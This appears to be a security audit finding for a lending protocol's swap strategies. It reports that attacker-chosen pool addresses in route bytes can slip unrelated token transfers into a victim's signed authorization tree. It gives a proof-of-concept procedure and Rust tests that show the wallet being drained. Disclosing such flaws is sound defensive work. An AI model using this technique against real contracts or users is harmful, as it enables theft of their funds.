### Title
Attacker-controlled route pools can invoke unauthorized token transfers under the caller's signed authorization tree - (File: contracts/controller/src/strategies/swap.rs)

### Summary
Caller-supplied strategy routes let an unprivileged user place an arbitrary contract address in the pool slot and cause the configured router to invoke that contract during controller strategies such as `swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, and `multiply`. A malicious pool can use that invocation to request unrelated token transfers from the transaction signer; if simulation records the transfer and the signer authorizes the resulting tree, the pool can steal wallet assets unrelated to the lending position. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description
`swap_tokens` forwards the caller's `StrategySwap` bytes to the configured aggregator after authorizing only the intended input-token transfer from the controller. [4](#0-3)  The router decodes each swap instruction by taking `pool`, `token_in`, and `token_out` from the caller-controlled `assets` registry, with no allowlist binding `pool` to the selected venue. [5](#0-4)  Venue adapters then invoke that supplied address, for example Phoenix calls `hop.pool.swap(...)` and Aquarius calls `pool.swap(...)`. [6](#0-5) [7](#0-6) 

This is analogous to command injection because attacker-controlled route bytes select code that executes inside an authorized transaction. The harness demonstrates that a rogue pool's `token.transfer(victim, attacker, amount)` is recorded as a child of the victim's `swap_collateral` authorization and executes when the poisoned tree is signed. [8](#0-7) [9](#0-8)  The controller's measured output and post-strategy solvency checks do not bound transfers to unrelated token contracts made under the caller's authorization tree. [10](#0-9) 

### Impact Explanation
A crafted route can steal arbitrary wallet tokens held by the caller, including assets never supplied to or listed by the lending protocol, while still returning enough `token_out` to satisfy measured-output and account-risk checks. [11](#0-10)  The loss is not limited to the strategy input because the malicious contract can name a different token, recipient, and amount in the nested transfer it requests. [12](#0-11) 

### Likelihood Explanation
The attack requires a victim to submit and authorize a poisoned route, but route bytes are opaque XDR and transaction simulation can present the unauthorized transfer as a nested authorization that may be signed without sufficiently strict client-side inspection. [13](#0-12)  A direct `execute_strategy` caller faces the same class of exposure because the router pulls input under `sender.require_auth()` and dispatches payload-selected pool addresses. [14](#0-13)  This is a High/Critical-severity user-fund theft primitive where a route provider or compromised quote path supplies the malicious payload.

### Recommendation
Bind route execution to governance-approved venue pool addresses or otherwise validate pool identity before invoking it, rather than accepting arbitrary pool addresses from route bytes. [2](#0-1)  Until pool admission is enforced contract-side, clients and transaction builders must decode the route and reject any authorization tree containing children other than the expected strategy input pull. [15](#0-14) 

### Proof of Concept
1. The victim has a normal funded lending account and an unrelated wallet token balance. [16](#0-15) 
2. An attacker deploys a contract implementing the expected pool `swap` ABI, but its body calls `unrelated_token.transfer(victim, attacker, wallet_balance)`; the attacker places that contract address in the route's pool registry slot. [12](#0-11) 
3. The victim calls `swap_collateral` with the crafted `swap` bytes; the controller invokes the configured router, and the router dispatches to the supplied pool address. [17](#0-16) [18](#0-17) 
4. In recording/simulation mode, the rogue token transfer appears as a child authorization under the victim's `swap_collateral` invocation, while the route still delivers fair output and updates the position. [19](#0-18) 
5. Under enforcing auth, signing the honest root-only tree rejects the transfer, but signing the simulation-produced poisoned tree permits it and leaves the victim with zero wallet tokens and the attacker with the full balance. [15](#0-14)

#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}

fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
